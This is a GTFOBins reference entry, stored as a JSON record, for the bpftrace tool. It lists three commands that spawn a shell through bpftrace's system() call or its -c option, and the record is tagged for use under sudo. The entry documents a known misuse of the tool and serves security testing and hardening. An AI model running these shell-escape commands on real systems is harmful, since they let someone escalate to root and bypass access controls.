{"title": "bpftrace", "source": "gtfobins", "source_label": "GTFOBins", "path": "bpftrace", "html": "<h1>bpftrace</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">bpftrace --unsafe -e &#x27;BEGIN {system(&quot;/bin/sh 1&lt;&amp;0&quot;);exit()}&#x27;</code></pre>\n<pre><code class=\"language-bash\">echo &#x27;BEGIN {system(&quot;/bin/sh 1&lt;&amp;0&quot;);exit()}&#x27; &gt;/path/to/temp-file\nbpftrace --unsafe /path/to/temp-file</code></pre>\n<pre><code class=\"language-bash\">bpftrace -c /bin/sh -e &#x27;END {exit()}&#x27;</code></pre>", "excerpt": "bpftrace Shell bpftrace --unsafe -e &#x27;BEGIN {system(&quot;/bin/sh 1&lt;&amp;0&quot;);exit()}&#x27; echo &#x27;BEGIN {system(&quot;/bin/sh 1&lt;&amp;0&quot;);exit()}&#x27; &gt;/path/to/temp-file bpftrace --unsafe /path/to/temp-file bpftrace -c…", "tags": ["func:shell", "ctx:sudo"]}